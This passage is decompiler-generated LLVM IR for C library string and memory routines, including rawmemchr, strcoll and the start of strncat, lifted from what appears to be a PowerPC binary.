  %v1_1001564c = add i32 %v0_1001564c, 2
  store i32 %v1_1001564c, i32* %r6.global-to-local, align 4
  %.pre79 = urem i32 %v1_10015608, 64
  %.pre80 = urem i32 %v1_10015618, 64
  br label %dec_label_pc_100156e8

dec_label_pc_10015654:                            ; preds = %dec_label_pc_10015628
  %v1_10015660 = add i32 %v0_1001562c, -4
  %v0_10015664 = load i32, i32* %r6.global-to-local, align 4
  %v1_10015664 = add i32 %v0_10015664, 1
  store i32 %v1_10015664, i32* %r6.global-to-local, align 4
  %.pre77 = urem i32 %v1_10015608, 64
  %.pre78 = urem i32 %v1_10015618, 64
  br label %dec_label_pc_100156cc

dec_label_pc_1001566c:                            ; preds = %dec_label_pc_10015620
  %v1_1001566c = inttoptr i32 %v1_10015614 to i32*
  %v2_1001566c = load i32, i32* %v1_1001566c, align 4
  %v0_10015670 = load i32, i32* @r4, align 4
  %v1_10015674 = add i32 %v1_10015614, 4
  %v2_10015674 = inttoptr i32 %v1_10015674 to i32*
  %v3_10015674 = load i32, i32* %v2_10015674, align 4
  %.pre75 = urem i32 %v1_10015608, 64
  %.pre76 = urem i32 %v1_10015618, 64
  br label %dec_label_pc_100156b0

dec_label_pc_1001567c:                            ; preds = %dec_label_pc_10015604
  %v1_1001567c = inttoptr i32 %v1_10015614 to i32*
  %v2_1001567c = load i32, i32* %v1_1001567c, align 4
  %v0_10015680 = load i32, i32* %r9.global-to-local, align 4
  %v1_10015680 = add i32 %v0_10015680, -1
  store i32 %v1_10015680, i32* %r6.global-to-local, align 4
  %v1_10015684 = add i32 %v1_10015614, 4
  %v2_10015684 = inttoptr i32 %v1_10015684 to i32*
  %v3_10015684 = load i32, i32* %v2_10015684, align 4
  %v1_10015688 = add i32 %v1_10015614, 8
  %v0_1001568c = load i32, i32* @r4, align 4
  %v1_1001568c = inttoptr i32 %v0_1001568c to i32*
  %v2_1001568c = load i32, i32* %v1_1001568c, align 4
  %v1_10015690 = add i32 %v0_1001568c, 4
  %.pre = urem i32 %v1_10015608, 64
  %.pre74 = urem i32 %v1_10015618, 64
  br label %dec_label_pc_10015694

dec_label_pc_10015694:                            ; preds = %dec_label_pc_10015714, %dec_label_pc_1001567c
  %v2_10015698.pre-phi = phi i32 [ %v2_100156ec.pre-phi, %dec_label_pc_10015714 ], [ %.pre74, %dec_label_pc_1001567c ]
  %v2_10015694.pre-phi = phi i32 [ %v2_100156e8.pre-phi, %dec_label_pc_10015714 ], [ %.pre, %dec_label_pc_1001567c ]
  %v1_100156a4 = phi i32 [ %v3_100156fc, %dec_label_pc_10015714 ], [ %v2_1001568c, %dec_label_pc_1001567c ]
  %v0_100156a0 = phi i32 [ %v1_10015714, %dec_label_pc_10015714 ], [ %v1_10015688, %dec_label_pc_1001567c ]
  %v0_10015698 = phi i32 [ %v3_100156f4, %dec_label_pc_10015714 ], [ %v3_10015684, %dec_label_pc_1001567c ]
  %v0_10015694 = phi i32 [ %v0_10015720, %dec_label_pc_10015714 ], [ %v2_1001567c, %dec_label_pc_1001567c ]
  %storemerge2 = phi i32 [ %v1_10015718, %dec_label_pc_10015714 ], [ %v1_10015690, %dec_label_pc_1001567c ]
  %v3_10015694 = shl i32 %v0_10015694, %v2_10015694.pre-phi
  %v3_10015698 = lshr i32 %v0_10015698, %v2_10015698.pre-phi
  store i32 %v3_10015698, i32* %r9.global-to-local, align 4
  %v2_1001569c = or i32 %v3_10015694, %v3_10015698
  store i32 %v2_1001569c, i32* %r0.global-to-local, align 4
  %v1_100156a0 = inttoptr i32 %v0_100156a0 to i32*
  %v2_100156a0 = load i32, i32* %v1_100156a0, align 4
  %v4_100156a4 = icmp eq i32 %v2_1001569c, %v1_100156a4
  store i1 %v4_100156a4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_100156a4, label %dec_label_pc_100156b0, label %dec_label_pc_10015738

dec_label_pc_100156b0:                            ; preds = %dec_label_pc_10015694, %dec_label_pc_1001566c
  %v2_100156b4.pre-phi = phi i32 [ %v2_10015698.pre-phi, %dec_label_pc_10015694 ], [ %.pre76, %dec_label_pc_1001566c ]
  %v2_100156b0.pre-phi = phi i32 [ %v2_10015694.pre-phi, %dec_label_pc_10015694 ], [ %.pre75, %dec_label_pc_1001566c ]
  %v0_100156c4 = phi i32 [ %storemerge2, %dec_label_pc_10015694 ], [ %v0_10015670, %dec_label_pc_1001566c ]
  %v1_100156c0.in.in = phi i32 [ %storemerge2, %dec_label_pc_10015694 ], [ %v0_10015670, %dec_label_pc_1001566c ]
  %v0_100156bc = phi i32 [ %v0_100156a0, %dec_label_pc_10015694 ], [ %v1_10015674, %dec_label_pc_1001566c ]
  %v0_100156b4 = phi i32 [ %v2_100156a0, %dec_label_pc_10015694 ], [ %v3_10015674, %dec_label_pc_1001566c ]
  %v0_100156b0 = phi i32 [ %v0_10015698, %dec_label_pc_10015694 ], [ %v2_1001566c, %dec_label_pc_1001566c ]
  %v1_100156c0.in = inttoptr i32 %v1_100156c0.in.in to i32*
  %v1_100156c0 = load i32, i32* %v1_100156c0.in, align 4
  %v3_100156b0 = shl i32 %v0_100156b0, %v2_100156b0.pre-phi
  %v3_100156b4 = lshr i32 %v0_100156b4, %v2_100156b4.pre-phi
  store i32 %v3_100156b4, i32* %r9.global-to-local, align 4
  %v2_100156b8 = or i32 %v3_100156b0, %v3_100156b4
  store i32 %v2_100156b8, i32* %r0.global-to-local, align 4
  %v1_100156bc = add i32 %v0_100156bc, 4
  %v2_100156bc = inttoptr i32 %v1_100156bc to i32*
  %v3_100156bc = load i32, i32* %v2_100156bc, align 4
  %v4_100156c0 = icmp eq i32 %v2_100156b8, %v1_100156c0
  store i1 %v4_100156c0, i1* %cr7_eq.global-to-local, align 1
  %v1_100156c4 = add i32 %v0_100156c4, 4
  %v2_100156c4 = inttoptr i32 %v1_100156c4 to i32*
  %v3_100156c4 = load i32, i32* %v2_100156c4, align 4
  br i1 %v4_100156c0, label %dec_label_pc_100156cc, label %dec_label_pc_1001573c

dec_label_pc_100156cc:                            ; preds = %dec_label_pc_100156b0, %dec_label_pc_10015654
  %v2_100156d0.pre-phi = phi i32 [ %v2_100156b4.pre-phi, %dec_label_pc_100156b0 ], [ %.pre78, %dec_label_pc_10015654 ]
  %v2_100156cc.pre-phi = phi i32 [ %v2_100156b0.pre-phi, %dec_label_pc_100156b0 ], [ %.pre77, %dec_label_pc_10015654 ]
  %v0_100156e0 = phi i32 [ %v0_100156c4, %dec_label_pc_100156b0 ], [ %v1_10015660, %dec_label_pc_10015654 ]
  %v1_100156dc = phi i32 [ %v3_100156c4, %dec_label_pc_100156b0 ], [ %v2_1001562c, %dec_label_pc_10015654 ]
  %v0_100156d8 = phi i32 [ %v0_100156bc, %dec_label_pc_100156b0 ], [ %v1_10015614, %dec_label_pc_10015654 ]
  %v0_100156d0 = phi i32 [ %v3_100156bc, %dec_label_pc_100156b0 ], [ %v3_10015634, %dec_label_pc_10015654 ]
  %v0_100156cc = phi i32 [ %v0_100156b4, %dec_label_pc_100156b0 ], [ %v2_10015630, %dec_label_pc_10015654 ]
  %v3_100156cc = shl i32 %v0_100156cc, %v2_100156cc.pre-phi
  %v3_100156d0 = lshr i32 %v0_100156d0, %v2_100156d0.pre-phi
  store i32 %v3_100156d0, i32* %r9.global-to-local, align 4
  %v2_100156d4 = or i32 %v3_100156cc, %v3_100156d0
  store i32 %v2_100156d4, i32* %r0.global-to-local, align 4
  %v1_100156d8 = add i32 %v0_100156d8, 8
  %v2_100156d8 = inttoptr i32 %v1_100156d8 to i32*
  %v3_100156d8 = load i32, i32* %v2_100156d8, align 4
  %v4_100156dc = icmp eq i32 %v2_100156d4, %v1_100156dc
  store i1 %v4_100156dc, i1* %cr7_eq.global-to-local, align 1
  %v1_100156e0 = add i32 %v0_100156e0, 8
  %v2_100156e0 = inttoptr i32 %v1_100156e0 to i32*
  %v3_100156e0 = load i32, i32* %v2_100156e0, align 4
  br i1 %v4_100156dc, label %dec_label_pc_100156e8, label %dec_label_pc_10015738

dec_label_pc_100156e8:                            ; preds = %dec_label_pc_100156cc, %dec_label_pc_1001563c
  %v2_100156ec.pre-phi = phi i32 [ %v2_100156d0.pre-phi, %dec_label_pc_100156cc ], [ %.pre80, %dec_label_pc_1001563c ]
  %v2_100156e8.pre-phi = phi i32 [ %v2_100156cc.pre-phi, %dec_label_pc_100156cc ], [ %.pre79, %dec_label_pc_1001563c ]
  %v0_10015718 = phi i32 [ %v0_100156e0, %dec_label_pc_100156cc ], [ %v1_10015648, %dec_label_pc_1001563c ]
  %v1_100156f8 = phi i32 [ %v3_100156e0, %dec_label_pc_100156cc ], [ %v2_1001562c, %dec_label_pc_1001563c ]
  %v0_10015714 = phi i32 [ %v0_100156d8, %dec_label_pc_100156cc ], [ %v1_10015644, %dec_label_pc_1001563c ]
  %v0_10015720 = phi i32 [ %v3_100156d8, %dec_label_pc_100156cc ], [ %v3_10015634, %dec_label_pc_1001563c ]
  %v0_100156e8 = phi i32 [ %v0_100156d0, %dec_label_pc_100156cc ], [ %v2_10015630, %dec_label_pc_1001563c ]
  %v3_100156e8 = shl i32 %v0_100156e8, %v2_100156e8.pre-phi
  %v3_100156ec = lshr i32 %v0_10015720, %v2_100156ec.pre-phi
  store i32 %v3_100156ec, i32* %r9.global-to-local, align 4
  %v2_100156f0 = or i32 %v3_100156e8, %v3_100156ec
  store i32 %v2_100156f0, i32* %r0.global-to-local, align 4
  %v1_100156f4 = add i32 %v0_10015714, 12
  %v2_100156f4 = inttoptr i32 %v1_100156f4 to i32*
  %v3_100156f4 = load i32, i32* %v2_100156f4, align 4
  %v4_100156f8 = icmp eq i32 %v2_100156f0, %v1_100156f8
  store i1 %v4_100156f8, i1* %cr7_eq.global-to-local, align 1
  %v1_100156fc = add i32 %v0_10015718, 12
  %v2_100156fc = inttoptr i32 %v1_100156fc to i32*
  %v3_100156fc = load i32, i32* %v2_100156fc, align 4
  br i1 %v4_100156f8, label %dec_label_pc_1001570c, label %dec_label_pc_1001573c

dec_label_pc_1001570c:                            ; preds = %dec_label_pc_100156e8
  %v0_1001570c = load i32, i32* %r6.global-to-local, align 4
  %v1_1001570c = add i32 %v0_1001570c, -4
  store i32 %v1_1001570c, i32* %r6.global-to-local, align 4
  %v4_1001570c = icmp eq i32 %v1_1001570c, 0
  br i1 %v4_1001570c, label %dec_label_pc_10015720, label %dec_label_pc_10015714

dec_label_pc_10015714:                            ; preds = %dec_label_pc_1001570c
  %v1_10015714 = add i32 %v0_10015714, 16
  %v1_10015718 = add i32 %v0_10015718, 16
  br label %dec_label_pc_10015694

dec_label_pc_10015720:                            ; preds = %dec_label_pc_1001570c
  %v3_10015720 = shl i32 %v0_10015720, %v2_100156e8.pre-phi
  %v3_10015724 = lshr i32 %v3_100156f4, %v2_100156ec.pre-phi
  store i32 %v3_10015724, i32* %r9.global-to-local, align 4
  %v2_10015728 = or i32 %v3_10015724, %v3_10015720
  store i32 %v2_10015728, i32* %r0.global-to-local, align 4
  %v4_10015730 = icmp eq i32 %v2_10015728, %v3_100156fc
  store i1 %v4_10015730, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10015730, label %dec_label_pc_10015750, label %dec_label_pc_10015738

dec_label_pc_10015738:                            ; preds = %dec_label_pc_100156cc, %dec_label_pc_10015694, %dec_label_pc_10015720
  %v1_10015738 = phi i32 [ %v1_100156dc, %dec_label_pc_100156cc ], [ %v1_100156a4, %dec_label_pc_10015694 ], [ %v3_100156fc, %dec_label_pc_10015720 ]
  %v0_10015738 = phi i32 [ %v2_100156d4, %dec_label_pc_100156cc ], [ %v2_1001569c, %dec_label_pc_10015694 ], [ %v2_10015728, %dec_label_pc_10015720 ]
  %v3_10015738 = icmp ugt i32 %v0_10015738, %v1_10015738
  %v4_10015738 = icmp eq i32 %v0_10015738, %v1_10015738
  store i1 %v4_10015738, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10015738, label %dec_label_pc_10015748, label %dec_label_pc_10015740

dec_label_pc_1001573c:                            ; preds = %dec_label_pc_100156e8, %dec_label_pc_100156b0
  %v1_10015704 = phi i32 [ %v1_100156f8, %dec_label_pc_100156e8 ], [ %v1_100156c0, %dec_label_pc_100156b0 ]
  %v0_10015704 = phi i32 [ %v2_100156f0, %dec_label_pc_100156e8 ], [ %v2_100156b8, %dec_label_pc_100156b0 ]
  %v3_10015704 = icmp ugt i32 %v0_10015704, %v1_10015704
  %v4_10015704 = icmp eq i32 %v0_10015704, %v1_10015704
  store i1 %v4_10015704, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10015704, label %dec_label_pc_10015748, label %dec_label_pc_10015740

dec_label_pc_10015740:                            ; preds = %dec_label_pc_10015738, %dec_label_pc_1001573c
  br label %dec_label_pc_10015750

dec_label_pc_10015748:                            ; preds = %dec_label_pc_10015738, %dec_label_pc_1001573c
  br label %dec_label_pc_10015750

dec_label_pc_10015750:                            ; preds = %dec_label_pc_10015748, %dec_label_pc_10015740, %dec_label_pc_10015720, %dec_label_pc_100155f8, %dec_label_pc_100155f0, %dec_label_pc_100155dc
  %storemerge = phi i32 [ 0, %dec_label_pc_100155dc ], [ -1, %dec_label_pc_100155f0 ], [ 1, %dec_label_pc_100155f8 ], [ 0, %dec_label_pc_10015720 ], [ -1, %dec_label_pc_10015740 ], [ 1, %dec_label_pc_10015748 ]
  %v3_10015750 = icmp eq i32 %storemerge, 0
  store i1 %v3_10015750, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10015750, label %dec_label_pc_1001576c, label %dec_label_pc_100157ac

dec_label_pc_1001575c:                            ; preds = %dec_label_pc_100154cc
  br label %dec_label_pc_100157ac

dec_label_pc_10015764:                            ; preds = %dec_label_pc_10015780
  br label %dec_label_pc_100157ac

dec_label_pc_1001576c:                            ; preds = %dec_label_pc_10015750
  %v0_1001576c = load i32, i32* @r31, align 4
  %v1_1001576c = call i32 @__asm_rlwinm(i32 %v0_1001576c, i32 0, i32 0, i32 29)
  store i32 %v1_1001576c, i32* %r0.global-to-local, align 4
  %v0_10015770 = load i32, i32* @r31, align 4
  %v1_10015770 = urem i32 %v0_10015770, 4
  %v0_10015774 = load i32, i32* %r29.global-to-local, align 4
  %v2_10015774 = add i32 %v0_10015774, %v1_1001576c
  store i32 %v2_10015774, i32* @r4, align 4
  %v0_10015778 = load i32, i32* @r30, align 4
  %v2_10015778 = add i32 %v0_10015778, %v1_1001576c
  store i32 %v2_10015778, i32* @r3, align 4
  br label %dec_label_pc_1001579c

dec_label_pc_10015780:                            ; preds = %dec_label_pc_100157a4
  %v0_10015780 = load i32, i32* @r3, align 4
  %v1_10015780 = inttoptr i32 %v0_10015780 to i8*
  %v2_10015780 = load i8, i8* %v1_10015780, align 1
  %v3_10015780 = zext i8 %v2_10015780 to i32
  store i32 %v3_10015780, i32* %r0.global-to-local, align 4
  %v1_10015784 = add i32 %v0_10015780, 1
  store i32 %v1_10015784, i32* @r3, align 4
  %v0_10015788 = load i32, i32* @r4, align 4
  %v1_10015788 = inttoptr i32 %v0_10015788 to i8*
  %v2_10015788 = load i8, i8* %v1_10015788, align 1
  %v3_10015788 = zext i8 %v2_10015788 to i32
  store i32 %v3_10015788, i32* %r9.global-to-local, align 4
  %v1_1001578c = add i32 %v0_10015788, 1
  store i32 %v1_1001578c, i32* @r4, align 4
  %v2_10015790 = sub nsw i32 %v3_10015780, %v3_10015788
  store i32 %v2_10015790, i32* %r0.global-to-local, align 4
  %v4_10015794 = icmp eq i8 %v2_10015780, %v2_10015788
  br i1 %v4_10015794, label %dec_label_pc_100157a4, label %dec_label_pc_10015764

dec_label_pc_1001579c:                            ; preds = %entry, %dec_label_pc_1001576c
  %v0_1001579c = phi i32 [ %arg1, %entry ], [ %v1_10015770, %dec_label_pc_1001576c ]
  %v1_1001579c = add i32 %v0_1001579c, 1
  br label %dec_label_pc_100157a4

dec_label_pc_100157a4:                            ; preds = %dec_label_pc_10015780, %dec_label_pc_1001579c
  %v0_100157a4 = phi i32 [ %v1_100157a4, %dec_label_pc_10015780 ], [ %v1_1001579c, %dec_label_pc_1001579c ]
  %v1_100157a4 = add i32 %v0_100157a4, -1
  %v2_100157a4 = icmp eq i32 %v1_100157a4, 0
  br i1 %v2_100157a4, label %dec_label_pc_100157a8, label %dec_label_pc_10015780

dec_label_pc_100157a8:                            ; preds = %dec_label_pc_100157a4
  br label %dec_label_pc_100157ac

dec_label_pc_100157ac:                            ; preds = %dec_label_pc_10015750, %dec_label_pc_10015764, %dec_label_pc_1001575c, %dec_label_pc_100157a8
  %v0_100157b4 = phi i32 [ %storemerge, %dec_label_pc_10015750 ], [ %v2_10015790, %dec_label_pc_10015764 ], [ %v2_100154e0, %dec_label_pc_1001575c ], [ 0, %dec_label_pc_100157a8 ]
  ret i32 %v0_100157b4

; uselistorder directives
  uselistorder i32 %v1_100157a4, { 1, 0 }
  uselistorder i32 %v0_10015704, { 1, 0 }
  uselistorder i32 %v1_10015704, { 1, 0 }
  uselistorder i32 %v0_10015738, { 1, 0 }
  uselistorder i32 %v1_10015738, { 1, 0 }
  uselistorder i32 %v2_100156e8.pre-phi, { 1, 0, 2 }
  uselistorder i32 %v2_100156ec.pre-phi, { 1, 0, 2 }
  uselistorder i32 %v1_100156c0, { 1, 0 }
  uselistorder i32 %v0_10015620, { 0, 2, 1 }
  uselistorder i32 %v1_10015614, { 0, 2, 1, 3, 4, 5, 6, 8, 7 }
  uselistorder i32 %v1_10015608, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_100155e8, { 1, 0 }
  uselistorder i32 %v1_100155e8, { 1, 0 }
  uselistorder i32 %v1_100155c8, { 1, 0 }
  uselistorder i32 %v1_10015504, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v1_100154fc, { 1, 5, 4, 3, 2, 6, 0 }
  uselistorder i32 %v1_100154e8, { 1, 0 }
  uselistorder i32 %v0_10015574, { 1, 2, 3, 4, 5, 6, 7, 10, 0, 9, 8 }
  uselistorder i32 %v0_10015570, { 8, 1, 2, 3, 4, 5, 6, 7, 9, 0, 11, 10 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 5, 9, 6, 7, 8, 10, 11, 12 }
  uselistorder i32* %r6.global-to-local, { 0, 4, 1, 2, 5, 3, 6, 7 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 17, 9, 10, 11, 12, 13, 14, 15, 16, 18, 20, 19 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 2, 23, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32 -8, { 2, 3, 4, 5, 6, 7, 1, 8, 0, 9, 10, 11 }
  uselistorder i32 %arg1, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_100157ac, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_100157a4, { 1, 0 }
  uselistorder label %dec_label_pc_1001579c, { 1, 0 }
  uselistorder label %dec_label_pc_10015748, { 1, 0 }
  uselistorder label %dec_label_pc_10015740, { 1, 0 }
  uselistorder label %dec_label_pc_10015738, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100155f8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100155f0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100155ec, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100154e8, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_100157b8 = urem i32 %arg1, 256
  store i32 %v1_100157b8, i32* %r4.global-to-local, align 4
  %v0_100157d01 = load i32, i32* @r3, align 4
  %v1_100157d02 = urem i32 %v0_100157d01, 4
  %v3_100157d04 = icmp eq i32 %v1_100157d02, 0
  br i1 %v3_100157d04, label %dec_label_pc_100157d8, label %dec_label_pc_100157c0

dec_label_pc_100157c0:                            ; preds = %entry, %dec_label_pc_100157c0
  %v1_100157c4 = phi i32 [ %v0_100157d8.pre, %dec_label_pc_100157c0 ], [ %v1_100157b8, %entry ]
  %v0_100157c0 = phi i32 [ %v1_100157cc, %dec_label_pc_100157c0 ], [ %v0_100157d01, %entry ]
  %v1_100157c0 = inttoptr i32 %v0_100157c0 to i8*
  %v2_100157c0 = load i8, i8* %v1_100157c0, align 1
  %v3_100157c0 = zext i8 %v2_100157c0 to i32
  %v4_100157c4 = icmp eq i32 %v3_100157c0, %v1_100157c4
  %v0_100157c8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_100157c4, i32 %v0_100157c8)
  %v0_100157cc = load i32, i32* @r3, align 4
  %v1_100157cc = add i32 %v0_100157cc, 1
  store i32 %v1_100157cc, i32* @r3, align 4
  %v1_100157d0 = urem i32 %v1_100157cc, 4
  %v3_100157d0 = icmp eq i32 %v1_100157d0, 0
  %v0_100157d8.pre = load i32, i32* %r4.global-to-local, align 4
  br i1 %v3_100157d0, label %dec_label_pc_100157d8, label %dec_label_pc_100157c0

dec_label_pc_100157d8:                            ; preds = %dec_label_pc_100157c0, %entry
  %v0_100157f09 = phi i32 [ %v0_100157d01, %entry ], [ %v1_100157cc, %dec_label_pc_100157c0 ]
  %v0_100157d8 = phi i32 [ %v1_100157b8, %entry ], [ %v0_100157d8.pre, %dec_label_pc_100157c0 ]
  %v1_100157d8 = mul i32 %v0_100157d8, 256
  %v2_100157e0 = or i32 %v1_100157d8, %v0_100157d8
  %v1_100157e8 = mul i32 %v2_100157e0, 65536
  %v2_100157ec = or i32 %v1_100157e8, %v2_100157e0
  br label %dec_label_pc_100157f0

dec_label_pc_100157f0:                            ; preds = %dec_label_pc_1001585c, %dec_label_pc_100157f0, %dec_label_pc_100157d8
  %v0_1001582c = phi i32 [ %v0_100157f09, %dec_label_pc_100157d8 ], [ %v1_100157f4, %dec_label_pc_100157f0 ], [ %v1_100157f4, %dec_label_pc_1001585c ]
  %v1_100157f0 = inttoptr i32 %v0_1001582c to i32*
  %v2_100157f0 = load i32, i32* %v1_100157f0, align 4
  %v1_100157f4 = add i32 %v0_1001582c, 4
  %v1_100157f8 = add i32 %v0_1001582c, 2
  store i32 %v1_100157f8, i32* @r8, align 4
  %v2_100157fc = xor i32 %v2_100157f0, %v2_100157ec
  %v1_10015804 = add i32 %v2_100157fc, 2130640639
  %v2_10015808 = xor i32 %v1_10015804, %v2_100157fc
  %v1_1001580c = add i32 %v0_1001582c, 1
  %v2_10015810 = and i32 %v2_10015808, -2130640640
  %v6_10015810 = icmp eq i32 %v2_10015810, -2130640640
  br i1 %v6_10015810, label %dec_label_pc_100157f0, label %dec_label_pc_1001581c

dec_label_pc_1001581c:                            ; preds = %dec_label_pc_100157f0
  %v2_1001581c = inttoptr i32 %v0_1001582c to i8*
  %v3_1001581c = load i8, i8* %v2_1001581c, align 1
  %v4_1001581c = zext i8 %v3_1001581c to i32
  %v1_10015820 = add i32 %v0_1001582c, 3
  %v4_10015824 = icmp eq i32 %v4_1001581c, %v0_100157d8
  br i1 %v4_10015824, label %dec_label_pc_1001582c, label %dec_label_pc_10015834

dec_label_pc_1001582c:                            ; preds = %dec_label_pc_1001581c
  ret i32 %v0_1001582c

dec_label_pc_10015834:                            ; preds = %dec_label_pc_1001581c
  %v2_10015834 = inttoptr i32 %v1_1001580c to i8*
  %v3_10015834 = load i8, i8* %v2_10015834, align 1
  %v4_10015834 = zext i8 %v3_10015834 to i32
  %v4_10015838 = icmp eq i32 %v4_10015834, %v0_100157d8
  br i1 %v4_10015838, label %dec_label_pc_10015840, label %dec_label_pc_10015848

dec_label_pc_10015840:                            ; preds = %dec_label_pc_10015834
  ret i32 %v1_1001580c

dec_label_pc_10015848:                            ; preds = %dec_label_pc_10015834
  %v2_10015848 = inttoptr i32 %v1_100157f8 to i8*
  %v3_10015848 = load i8, i8* %v2_10015848, align 1
  %v4_10015848 = zext i8 %v3_10015848 to i32
  %v4_1001584c = icmp eq i32 %v4_10015848, %v0_100157d8
  br i1 %v4_1001584c, label %dec_label_pc_10015854, label %dec_label_pc_1001585c

dec_label_pc_10015854:                            ; preds = %dec_label_pc_10015848
  ret i32 %v1_100157f8

dec_label_pc_1001585c:                            ; preds = %dec_label_pc_10015848
  %v2_1001585c = inttoptr i32 %v1_10015820 to i8*
  %v3_1001585c = load i8, i8* %v2_1001585c, align 1
  %v4_1001585c = zext i8 %v3_1001585c to i32
  %v4_10015860 = icmp eq i32 %v4_1001585c, %v0_100157d8
  br i1 %v4_10015860, label %dec_label_pc_10015868, label %dec_label_pc_100157f0

dec_label_pc_10015868:                            ; preds = %dec_label_pc_1001585c
  ret i32 %v1_10015820

; uselistorder directives
  uselistorder i32 %v1_100157f4, { 1, 0 }
  uselistorder i32 %v0_1001582c, { 0, 1, 3, 2, 6, 5, 4 }
  uselistorder i32 %v2_100157e0, { 1, 0 }
  uselistorder i32 %v0_100157d8, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_100157cc, { 1, 0, 3, 2 }
  uselistorder i32 %v0_100157d01, { 2, 1, 0 }
  uselistorder i32 %v1_100157b8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_100157c0, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1001587c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10015874

dec_label_pc_10015874:                            ; preds = %dec_label_pc_10015898, %entry
  %v0_1001587c = phi i32 [ %v1_10015880, %dec_label_pc_10015898 ], [ %v0_1001587c.pre, %entry ]
  %v0_10015874 = phi i32 [ %v1_10015878, %dec_label_pc_10015898 ], [ %tmp, %entry ]
  %v1_10015874 = inttoptr i32 %v0_10015874 to i8*
  %v2_10015874 = load i8, i8* %v1_10015874, align 1
  %v3_10015874 = zext i8 %v2_10015874 to i32
  %v1_1001587c = inttoptr i32 %v0_1001587c to i8*
  %v2_1001587c = load i8, i8* %v1_1001587c, align 1
  %v3_1001587c = zext i8 %v2_1001587c to i32
  %v3_10015884 = icmp eq i8 %v2_10015874, 0
  br i1 %v3_10015884, label %dec_label_pc_10015890, label %dec_label_pc_10015898

dec_label_pc_10015890:                            ; preds = %dec_label_pc_10015874
  %v1_10015890 = sub nsw i32 0, %v3_1001587c
  ret i32 %v1_10015890

dec_label_pc_10015898:                            ; preds = %dec_label_pc_10015874
  %v4_10015888 = icmp eq i8 %v2_10015874, %v2_1001587c
  %v1_10015880 = add i32 %v0_1001587c, 1
  %v1_10015878 = add i32 %v0_10015874, 1
  br i1 %v4_10015888, label %dec_label_pc_10015874, label %dec_label_pc_1001589c

dec_label_pc_1001589c:                            ; preds = %dec_label_pc_10015898
  %v2_1001589c = sub nsw i32 %v3_10015874, %v3_1001587c
  ret i32 %v2_1001589c

; uselistorder directives
  uselistorder i32 %v3_1001587c, { 1, 0 }
  uselistorder i32 %v0_10015874, { 1, 0 }
  uselistorder i32 %v0_1001587c, { 1, 0 }
}

define i32 @__GI_strncat(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100158a8

dec_label_pc_100158a8:                            ; preds = %dec_label_pc_100158a8, %entry
  %v0_100158a8 = phi i32 [ %v1_100158ac, %dec_label_pc_100158a8 ], [ %tmp, %entry ]
  %v1_100158a8 = inttoptr i32 %v0_100158a8 to i8*
  %v2_100158a8 = load i8, i8* %v1_100158a8, align 1
  %v1_100158ac = add i32 %v0_100158a8, 1
  store i32 %v1_100158ac, i32* %r11.global-to-local, align 4
  %v3_100158b0 = icmp eq i8 %v2_100158a8, 0
  store i1 %v3_100158b0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100158b0, label %dec_label_pc_100158b8, label %dec_label_pc_100158a8

dec_label_pc_100158b8:                            ; preds = %dec_label_pc_100158a8
  %v3_100158b8 = icmp eq i32 %arg2, 3
  store i1 %v3_100158b8, i1* %cr7_eq.global-to-local, align 1
  %v1_100158bc = add i32 %v0_100158a8, -1
  store i32 %v1_100158bc, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %tmp8 = icmp ult i32 %arg2, 4
  br i1 %tmp8, label %dec_label_pc_10015958, label %dec_label_pc_100158c8

dec_label_pc_100158c8:                            ; preds = %dec_label_pc_100158b8
  %v1_100158c8 = udiv i32 %arg2, 4
  store i32 %v1_100158c8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_100158d0

dec_label_pc_100158d0:                            ; preds = %dec_label_pc_100158d0.dec_label_pc_100158d0_crit_edge, %dec_label_pc_100158c8
  %v2_100158e0 = phi i32 [ %v0_100158d4.pre, %dec_label_pc_100158d0.dec_label_pc_100158d0_crit_edge ], [ %v1_100158bc, %dec_label_pc_100158c8 ]
  %v0_100158d0 = load i32, i32* @r4, align 4
  %v1_100158d0 = inttoptr i32 %v0_100158d0 to i8*
  %v2_100158d0 = load i8, i8* %v1_100158d0, align 1
  %v1_100158d4 = add i32 %v2_100158e0, 1
  store i32 %v1_100158d4, i32* %r9.global-to-local, align 4
  %v1_100158d8 = add i32 %v2_100158e0, 2
  store i32 %v1_100158d8, i32* %r7.global-to-local, align 4
  %v3_100158dc = icmp eq i8 %v2_100158d0, 0
